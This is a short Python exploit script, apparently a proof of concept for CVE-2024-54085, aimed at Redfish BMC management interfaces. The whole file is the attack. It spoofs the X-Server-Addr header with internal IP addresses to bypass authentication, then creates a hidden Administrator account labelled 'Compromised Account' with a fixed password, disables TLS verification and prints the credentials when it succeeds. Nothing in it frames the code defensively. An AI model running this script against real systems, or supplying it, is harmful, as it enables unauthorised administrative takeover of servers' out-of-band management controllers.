import json
import requests
import sys

if len(sys.argv) < 2:
    print("Example: python3 CVE_2024-54085.py https://ip:port")
    sys.exit()

URL = sys.argv[1]
if URL[-1] == '/':
    URL = URL[:-1]

Password = 'password123'  # Change this field if needed.
UserName = 'pwned2'       # Change this field if needed.
headers = [
    {'X-Server-Addr': '169.254.0.17:'},
    {'X-Server-Addr': '127.0.0.1:'},
    {'X-Server-Addr': '192.168.31.2:'}
]

for header in headers:
    response = requests.post(
        f'{URL}/redfish/v1/AccountService/Accounts',
        json={
            'Name': 'test',
            'Description': 'Compromised Account',
            'Enabled': True,
            'Password': Password,
            'UserName': UserName,
            'RoleId': 'Administrator',
            'Locked': False,
            'PasswordChangeRequired': False
        },
        verify=False,
        headers=header
    )

    # Проверка ответа
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        response_json = {}

    if response_json.get("UserName", "NO") != "NO":
        print("Account was created successfully!\n")
        print(f"Login: {response_json['UserName']}")
        print(f"Password: {Password}")
        break
else:
    print("Failed...")

